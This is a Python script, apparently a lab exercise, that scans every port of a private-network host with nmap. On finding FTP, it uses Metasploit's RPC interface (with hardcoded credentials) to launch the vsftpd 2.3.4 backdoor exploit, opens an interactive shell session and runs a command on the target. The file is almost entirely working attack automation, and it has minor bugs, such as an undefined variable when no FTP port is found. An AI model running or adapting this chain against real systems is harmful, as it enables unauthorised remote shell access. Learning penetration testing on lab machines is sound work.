import nmap
import socket
from time import sleep
from pymetasploit3.msfrpc import MsfRpcClient

def scan_ports(ip_address):
    nm = nmap.PortScanner()
    nm.scan(ip_address, arguments='-p 1-65535')

    for host in nm.all_hosts():
        print(f"Scan results for {host} ({nm[host].hostname()}):")
        for proto in nm[host].all_protocols():
            print(f"Protocol: {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                print(f"Port {port}: {state}")

                if state == 'open':
                    try:
                        service = socket.getservbyport(port)
                        print(f"Service on port {port}: {service}")
                        if service == "ftp":
                            return "Le port est exploitable en utilisant le vsftpd"
                    except (socket.error, socket.herror, socket.gaierror, socket.timeout):
                        print(f"Unable to determine service on port {port}")

def main():
    ip_to_scan = '192.168.56.101'
    result = scan_ports(ip_to_scan)

    if result:
        print(result)
        
        client = MsfRpcClient(username='user', password='pass123', server='192.168.56.1', port=55553)

        client.login('user', 'pass123')

        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

        ip = "192.168.56.101"
        exploit['RHOSTS'] = ip
        exploit['RPORT'] = 21
        
        exploit.execute(payload='cmd/unix/interact')
        
        sessions = client.sessions.list
        print(sessions)
        
        session_id = None
    for sid, sinfo in sessions.items():
        if sinfo.get('session_host') == ip:
            session_id = sid
            break

    if session_id is not None:
        print(f"Got Shell for Session ID {session_id}!!!")
        try:
            session = client.sessions.session(session_id)

            session.write('hostname')
            print(session.read())

            session.stop()
        except Exception as e:
            print(e)
    else:
        print("Shell Not Found!!!")

if __name__ == '__main__':
    main()
